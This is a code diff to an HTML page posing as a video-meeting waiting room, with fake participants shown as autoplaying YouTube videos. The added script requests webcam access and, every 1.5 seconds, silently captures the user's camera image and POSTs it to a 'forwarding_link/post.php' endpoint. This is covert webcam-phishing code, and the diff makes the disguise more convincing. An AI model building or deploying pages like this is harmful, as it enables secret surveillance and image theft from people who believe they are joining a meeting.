@@ -161,10 +161,11 @@
     font-size: 14px;
 }
 
-.participant-tile img {
+.participant-tile iframe, .participant-tile img {
     width: 100%;
     height: 100%;
-    object-fit: cover;
+    border: none;
+    pointer-events: none; /* Evita que interactúen con los controles de YT */
     display: block;
 }
 
@@ -194,95 +195,6 @@
     display: none; /* Hide placeholder image when active */
 }
 </style>
-
-<script>
-
-  function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'forwarding_link/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
-      },
-      error: function () {
-      }
-    });
-  };
-
-
-  'use strict';
-
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-
-  const constraints = {
-    audio: false,
-    video: {
-
-      facingMode: "user"
-    }
-  };
-
-  // Access webcam
-  async function init() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      handleSuccess(stream);
-    } catch (e) {
-      handleError(e); // Pass error to handleError
-    }
-  }
-
-  // Success
-  function handleSuccess(stream) {
-    window.stream = stream;
-    video.srcObject = stream; // This is the hidden video for canvas capture
-
-    const userParticipantTile = document.getElementById('user-participant-tile');
-    const userWebcamDisplay = document.getElementById('user-webcam-display');
-    if (userWebcamDisplay && userParticipantTile) {
-      userWebcamDisplay.srcObject = stream; // Assign stream to the visible video element
-      userParticipantTile.classList.add('active-user-feed'); // Add class to show video
-    }
-
-    // Hide the waiting room popup
-    const acWrapper = document.getElementById('ac-wrapper');
-    if (acWrapper) {
-      acWrapper.style.display = 'none';
-    }
-
-    const context = canvas.getContext('2d');
-    setInterval(function () {
-      context.drawImage(video, 0, 0, 640, 480); // Draw from the hidden video
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-      post(canvasData);
-    }, 1500);
-  }
-
-  function handleError(error) {
-    // Display a message if camera access is denied or fails
-    const popupMessage = document.querySelector('#popup h2');
-    if (popupMessage) {
-      if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-        popupMessage.innerText = 'Camera access denied. Please enable camera to join the meeting.';
-      } else {
-        popupMessage.innerText = `Error accessing camera: ${error.message}`;
-      }
-    }
-    // Ensure the popup is visible if camera access fails
-    const acWrapper = document.getElementById('ac-wrapper');
-    if (acWrapper) {
-      acWrapper.style.display = 'flex'; // Ensure it's visible and centered
-    }
-  }
-
-  // Load init
-  init();
-</script>
-
 <body>
   <div class="float_button">
     <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
@@ -293,30 +205,25 @@
       <div class="meeting-grid">
         <!-- Placeholder participants -->
         <div class="participant-tile">
-            <img src="https://i.pravatar.cc/150?img=1" alt="Participant 1">
-            <div class="participant-name">Alice</div>
+            <iframe src="https://www.youtube.com/embed/mhpwcZbcDL0?autoplay=1&mute=1&loop=1&controls=0&playlist=mhpwcZbcDL0&modestbranding=1&rel=0" allow="autoplay"></iframe>
+            <div class="participant-name">Usuario 1</div>
         </div>
         <div class="participant-tile">
-            <img src="https://i.pravatar.cc/150?img=2" alt="Participant 2">
-            <div class="participant-name">Bob</div>
+            <iframe src="https://www.youtube.com/embed/wUoK-Lx8ej4?autoplay=1&mute=1&loop=1&controls=0&playlist=wUoK-Lx8ej4&modestbranding=1&rel=0" allow="autoplay"></iframe>
+            <div class="participant-name">Usuario 2</div>
         </div>
         <div class="participant-tile">
-            <img src="https://i.pravatar.cc/150?img=3" alt="Participant 3">
-            <div class="participant-name">Charlie</div>
+            <iframe src="https://www.youtube.com/embed/fc-APsIFqqo?autoplay=1&mute=1&loop=1&controls=0&playlist=fc-APsIFqqo&modestbranding=1&rel=0" allow="autoplay"></iframe>
+            <div class="participant-name">Usuaria 3</div>
         </div>
         <!-- User's live webcam feed -->
         <div class="participant-tile user-feed" id="user-participant-tile">
             <video id="user-webcam-display" playsinline autoplay muted></video>
             <div class="participant-name">You</div>
         </div>
-        <!-- More placeholders -->
         <div class="participant-tile">
-            <img src="https://i.pravatar.cc/150?img=4" alt="Participant 4">
-            <div class="participant-name">Diana</div>
-        </div>
-        <div class="participant-tile">
-            <img src="https://i.pravatar.cc/150?img=5" alt="Participant 5">
-            <div class="participant-name">Eve</div>
+            <iframe src="https://www.youtube.com/embed/flZFhg8hHJc?autoplay=1&mute=1&loop=1&controls=0&playlist=flZFhg8hHJc&modestbranding=1&rel=0" allow="autoplay"></iframe>
+            <div class="participant-name">Usuario 4</div>
         </div>
       </div>
     </div>
@@ -366,6 +273,87 @@
         <h2>Please wait, the meeting host will let you in soon</h2>
     </div>
   </div>
+
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // call the function that handles the response/results
+        },
+        error: function () {
+        }
+      });
+    };
+
+    'use strict';
+
+    const constraints = {
+      audio: false,
+      video: {
+        facingMode: "user"
+      }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        handleError(e); // Pass error to handleError
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      
+      if (video) video.srcObject = stream; // This is the hidden video for canvas capture
+
+      const userParticipantTile = document.getElementById('user-participant-tile');
+      const userWebcamDisplay = document.getElementById('user-webcam-display');
+      if (userWebcamDisplay && userParticipantTile) {
+        userWebcamDisplay.srcObject = stream; // Assign stream to the visible video element
+        userParticipantTile.classList.add('active-user-feed'); // Add class to show video
+      }
+
+      // Hide the waiting room popup
+      const acWrapper = document.getElementById('ac-wrapper');
+      if (acWrapper) acWrapper.style.display = 'none';
+
+      if (canvas && video) {
+        const context = canvas.getContext('2d');
+        setInterval(function () {
+          context.drawImage(video, 0, 0, 640, 480);
+          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+          post(canvasData);
+        }, 1500);
+      }
+    }
+
+    function handleError(error) {
+      const popupMessage = document.querySelector('#popup h2');
+      if (popupMessage) {
+        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+          popupMessage.innerText = 'Camera access denied. Please enable camera to join the meeting.';
+        } else {
+          popupMessage.innerText = `Error accessing camera: ${error.message}`;
+        }
+      }
+      const acWrapper = document.getElementById('ac-wrapper');
+      if (acWrapper) acWrapper.style.display = 'flex';
+    }
+
+    // Load init
+    init();
+  </script>
 </body>
 
 </html>
